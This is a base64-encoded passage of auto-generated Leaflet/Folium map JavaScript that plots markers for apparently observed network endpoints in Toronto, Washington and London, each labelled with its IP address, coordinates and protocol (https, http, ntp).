0M2YzOWEzMmU1ZGY3OWQgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZmEzNmJhY2Q1ZDQzNGQ4MTgxZGI5NjAzMjNhZWY1ZGQuc2V0SWNvbihpY29uX2QxOTU2OTE4NGI2MTQxOGE5NDNmMzlhMzJlNWRmNzlkKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzMzMWMyZjNiZjU0YzRhOGE4ZTFjYmYwOGM5MGJiOGFjID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfODZmYWVmNTA3YTc2NGQ5OGE2ODQxZWMyZmRjMzQzNWMgPSAkKGA8ZGl2IGlkPSJodG1sXzg2ZmFlZjUwN2E3NjRkOThhNjg0MWVjMmZkYzM0MzVjIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj40MC44NS4yMzIuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzMzMWMyZjNiZjU0YzRhOGE4ZTFjYmYwOGM5MGJiOGFjLnNldENvbnRlbnQoaHRtbF84NmZhZWY1MDdhNzY0ZDk4YTY4NDFlYzJmZGMzNDM1Yyk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2ZhMzZiYWNkNWQ0MzRkODE4MWRiOTYwMzIzYWVmNWRkLmJpbmRQb3B1cChwb3B1cF8zMzFjMmYzYmY1NGM0YThhOGUxY2JmMDhjOTBiYjhhYykKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZmEzNmJhY2Q1ZDQzNGQ4MTgxZGI5NjAzMjNhZWY1ZGQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2I2YmNlYjk4MzQ0YzQ2ZTI4NGMwOGQyNDVlMzMyZGZmID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzY1ZDY2N2VmNjliNTQ4MDZhYjMyMjYzNWVkNmZlY2ZkID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2I2YmNlYjk4MzQ0YzQ2ZTI4NGMwOGQyNDVlMzMyZGZmLnNldEljb24oaWNvbl82NWQ2NjdlZjY5YjU0ODA2YWIzMjI2MzVlZDZmZWNmZCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9jOTUzZmU2Yzc1OTQ0ODMxODA1YjA3MjFkMmNhYTg4YyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzJlZjY0ZGZhNGExNTQ2MDdiMTE5MmMwMGNhY2JiZDgwID0gJChgPGRpdiBpZD0iaHRtbF8yZWY2NGRmYTRhMTU0NjA3YjExOTJjMDBjYWNiYmQ4MCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4yMzkuMjIwLjMyPGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9jOTUzZmU2Yzc1OTQ0ODMxODA1YjA3MjFkMmNhYTg4Yy5zZXRDb250ZW50KGh0bWxfMmVmNjRkZmE0YTE1NDYwN2IxMTkyYzAwY2FjYmJkODApOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl9iNmJjZWI5ODM0NGM0NmUyODRjMDhkMjQ1ZTMzMmRmZi5iaW5kUG9wdXAocG9wdXBfYzk1M2ZlNmM3NTk0NDgzMTgwNWIwNzIxZDJjYWE4OGMpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyX2I2YmNlYjk4MzQ0YzQ2ZTI4NGMwOGQyNDVlMzMyZGZmLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNDZkN2I4ZDcyOWJjNGZiOTljYmZhYjc5OTBiNTQ1NDYgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZTBmNjYyZDc1YzUyNDAyNDgzNWNmYmJiOTU3ZDUwNDYgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfNDZkN2I4ZDcyOWJjNGZiOTljYmZhYjc5OTBiNTQ1NDYuc2V0SWNvbihpY29uX2UwZjY2MmQ3NWM1MjQwMjQ4MzVjZmJiYjk1N2Q1MDQ2KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzQxNmM3OWUwNmJkYjQyMThiMTY0ODViNmQ4MmM1N2QzID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfZDM1ODFkMDY5ZTk2NGJkZjk1ZTlkZGRhYWQzMjFhZDEgPSAkKGA8ZGl2IGlkPSJodG1sX2QzNTgxZDA2OWU5NjRiZGY5NWU5ZGRkYWFkMzIxYWQxIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjE2OC41MC43OTxicj5wcm90b2NvbD1odHRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF80MTZjNzllMDZiZGI0MjE4YjE2NDg1YjZkODJjNTdkMy5zZXRDb250ZW50KGh0bWxfZDM1ODFkMDY5ZTk2NGJkZjk1ZTlkZGRhYWQzMjFhZDEpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl80NmQ3YjhkNzI5YmM0ZmI5OWNiZmFiNzk5MGI1NDU0Ni5iaW5kUG9wdXAocG9wdXBfNDE2Yzc5ZTA2YmRiNDIxOGIxNjQ4NWI2ZDgyYzU3ZDMpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzQ2ZDdiOGQ3MjliYzRmYjk5Y2JmYWI3OTkwYjU0NTQ2LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8yZjY4Y2Y4YTdmNzk0ZjM5YjI1ZDNjMzY0NmJjMGY5ZCA9IEwubWFya2VyKAogICAgICAgICAgICBbMzguNzE2MywgLTc4LjE3MDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9jYTg1OWE0ZDI0YTI0MmIzYTZhOGUyZDgwMTgyNjczOSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8yZjY4Y2Y4YTdmNzk0ZjM5YjI1ZDNjMzY0NmJjMGY5ZC5zZXRJY29uKGljb25fY2E4NTlhNGQyNGEyNDJiM2E2YThlMmQ4MDE4MjY3MzkpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYzEzZGVmNTQ3YmEwNDkxNjk1ZjI1OTI3M2FlODNiZGYgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF83YjNkNmZiYmViYjE0NzQyOTQwNmFhYjhkMTM3ZThmYSA9ICQoYDxkaXYgaWQ9Imh0bWxfN2IzZDZmYmJlYmIxNDc0Mjk0MDZhYWI4ZDEzN2U4ZmEiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMTY4LjUwLjc5PGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2MxM2RlZjU0N2JhMDQ5MTY5NWYyNTkyNzNhZTgzYmRmLnNldENvbnRlbnQoaHRtbF83YjNkNmZiYmViYjE0NzQyOTQwNmFhYjhkMTM3ZThmYSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzJmNjhjZjhhN2Y3OTRmMzliMjVkM2MzNjQ2YmMwZjlkLmJpbmRQb3B1cChwb3B1cF9jMTNkZWY1NDdiYTA0OTE2OTVmMjU5MjczYWU4M2JkZikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMmY2OGNmOGE3Zjc5NGYzOWIyNWQzYzM2NDZiYzBmOWQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzU2OGQwYjBlYzA5OTRkMDNiMzNmYTNkNzEyZjliYzkwID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzI5NjBhODZlZTQyMjQ2ZWVhOTM2NTllNGVkOWQ5MmVjID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzU2OGQwYjBlYzA5OTRkMDNiMzNmYTNkNzEyZjliYzkwLnNldEljb24oaWNvbl8yOTYwYTg2ZWU0MjI0NmVlYTkzNjU5ZTRlZDlkOTJlYyk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF80MWExNTUwM2I3OTQ0OTE1ODg0M2M5NjdlMmI3ZDBkZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzA3M2Y2ODU3YzUyODRjZTU4Y2M0OTJlNGE3YWI2NDk0ID0gJChgPGRpdiBpZD0iaHRtbF8wNzNmNjg1N2M1Mjg0Y2U1OGNjNDkyZTRhN2FiNjQ5NCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj41Mi4yMzkuMjIwLjMyPGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF80MWExNTUwM2I3OTQ0OTE1ODg0M2M5NjdlMmI3ZDBkZS5zZXRDb250ZW50KGh0bWxfMDczZjY4NTdjNTI4NGNlNThjYzQ5MmU0YTdhYjY0OTQpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl81NjhkMGIwZWMwOTk0ZDAzYjMzZmEzZDcxMmY5YmM5MC5iaW5kUG9wdXAocG9wdXBfNDFhMTU1MDNiNzk0NDkxNTg4NDNjOTY3ZTJiN2QwZGUpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzU2OGQwYjBlYzA5OTRkMDNiMzNmYTNkNzEyZjliYzkwLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfNWNmMmQwMTk1ZDAzNGYxZDhiYzhhMDI0OGQyODVkNzggPSBMLm1hcmtlcigKICAgICAgICAgICAgWzUxLjUxNDIsIC0wLjA5MzFdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9jYjEzMWFlZWMzYjM0NTc3OGYzMmM5OTc5MzYwMjY5YiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl81Y2YyZDAxOTVkMDM0ZjFkOGJjOGEwMjQ4ZDI4NWQ3OC5zZXRJY29uKGljb25fY2IxMzFhZWVjM2IzNDU3NzhmMzJjOTk3OTM2MDI2OWIpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNzEwYWY1OTJmYTVjNGI0MmFjY2M1YWZkYzU1MzQ0MmQgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9lODkxNTI0MDlmZWM0ODZmYTQzNjdlMGRlMGVlZmZjNyA9ICQoYDxkaXYgaWQ9Imh0bWxfZTg5MTUyNDA5ZmVjNDg2ZmE0MzY3ZTBkZTBlZWZmYzciIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUdCLCBDb3VudHJ5TmFtZT1Vbml0ZWQgS2luZ2RvbSwgU3RhdGU9RW5nbGFuZCwgQ2l0eT1Mb25kb24sIExvbmdpdHVkZT0tMC4wOTMxLCBMYXRpdHVkZT01MS41MTQyPGJyPjkxLjE4OS45NC40PGJyPnByb3RvY29sPW50cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNzEwYWY1OTJmYTVjNGI0MmFjY2M1YWZkYzU1MzQ0MmQuc2V0Q29udGVudChodG1sX2U4OTE1MjQwOWZlYzQ4NmZhNDM2N2UwZGUwZWVmZmM3KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNWNmMmQwMTk1ZDAzNGYxZDhiYzhhMDI0OGQyODVkNzguYmluZFBvcHVwKHBvcHVwXzcxMGFmNTkyZmE1YzRiNDJhY2NjNWFmZGM1NTM0NDJkKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl81Y2YyZDAxOTVkMDM0ZjFkOGJjOGEwMjQ4ZDI4NWQ3OC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBMb25kb24sIFVuaXRlZCBLaW5nZG9tLCBwcm90b2NvbD1udHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl82Y2E2NDlhNzM3YmI0NTI3YmU4NDkzYTYzZWM2ODU0ZCA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9mZTYyNDY4N2IzNGU0YjhjODJmMjlkNzYyMGI3NDA0YiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl82Y2E2NDlhNzM3YmI0NTI3YmU4NDkzYTYzZWM2ODU0ZC5zZXRJY29uKGljb25fZmU2MjQ2ODdiMzRlNGI4YzgyZjI5ZDc2MjBiNzQwNGIpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfNGI2OTNjNTkxZmU5NGI3ZTk4ZGU0YTgxZTIzOTZjMDMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF83Njg0ZjU0MGYzMzQ0YmVhODMyZWZlNjkxNmNkYTRiOCA9ICQoYDxkaXYgaWQ9Imh0bWxfNzY4NGY1NDBmMzM0NGJlYTgzMmVmZTY5MTZjZGE0YjgiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjQwLjg1LjIzMi42NDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfNGI2OTNjNTkxZmU5NGI3ZTk4ZGU0YTgxZTIzOTZjMDMuc2V0Q29udGVudChodG1sXzc2ODRmNTQwZjMzNDRiZWE4MzJlZmU2OTE2Y2RhNGI4KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNmNhNjQ5YTczN2JiNDUyN2JlODQ5M2E2M2VjNjg1NGQuYmluZFBvcHVwKHBvcHVwXzRiNjkzYzU5MWZlOTRiN2U5OGRlNGE4MWUyMzk2YzAzKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl82Y2E2NDlhNzM3YmI0NTI3YmU4NDkzYTYzZWM2ODU0ZC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMThjNjhmNmY0ZGNlNDJiMGJjYjU1ODk1YjM2YWE1MDEgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMDkyNGU0ODc4MmZkNGVmNWExNDYwOWIzZThhMGJmMDcgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMThjNjhmNmY0ZGNlNDJiMGJjYjU1ODk1YjM2YWE1MDEuc2V0SWNvbihpY29uXzA5MjRlNDg3ODJmZDRlZjVhMTQ2MDliM2U4YTBiZjA3KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzEzMjhkNzUwNzI4MTQ0Mjc5NDQwYWQwMzIzMmZjOGQxID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMjBiOTkyYTgyOThlNGJjNzhmYmYzNGU3ZmU1MzliMTMgPSAkKGA8ZGl2IGlkPSJodG1sXzIwYjk5MmE4Mjk4ZTRiYzc4ZmJmMzRlN2ZlNTM5YjEzIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4yMjAuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzEzMjhkNzUwNzI4MTQ0Mjc5NDQwYWQwMzIzMmZjOGQxLnNldENvbnRlbnQoaHRtbF8yMGI5OTJhODI5OGU0YmM3OGZiZjM0ZTdmZTUzOWIxMyk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzE4YzY4ZjZmNGRjZTQyYjBiY2I1NTg5NWIzNmFhNTAxLmJpbmRQb3B1cChwb3B1cF8xMzI4ZDc1MDcyODE0NDI3OTQ0MGFkMDMyMzJmYzhkMSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfMThjNjhmNmY0ZGNlNDJiMGJjYjU1ODk1YjM2YWE1MDEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAg